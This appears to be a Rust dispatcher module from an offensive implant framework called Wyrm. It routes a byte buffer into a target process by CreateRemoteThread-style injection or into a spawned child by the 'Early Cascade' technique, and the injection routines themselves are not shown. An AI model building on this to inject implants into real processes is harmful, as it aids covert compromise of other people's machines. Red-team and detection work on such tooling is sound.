//! A module for loading / injecting Wyrm into other / new processes.

use shared::tasks::WyrmResult;

use crate::spawn_inject::{early_cascade::early_cascade_spawn_child, injection::virgin_inject};

pub mod early_cascade;
mod injection;

pub enum SpawnMethod {
    EarlyCascade,
}

pub enum InjectMethod {
    /// Classic CreateRemoteThread...
    Virgin,
}

pub struct Inject;

impl Inject {
    pub fn inject_wyrm(buf: &[u8], method: InjectMethod, pid: u32) -> WyrmResult<String> {
        match method {
            InjectMethod::Virgin => virgin_inject(buf, pid),
        }
    }
}

pub struct Spawn;

impl Spawn {
    pub fn spawn_child(buf: Vec<u8>, method: SpawnMethod, spawn_as: &str) -> WyrmResult<String> {
        match method {
            SpawnMethod::EarlyCascade => early_cascade_spawn_child(buf, spawn_as),
        }
    }
}
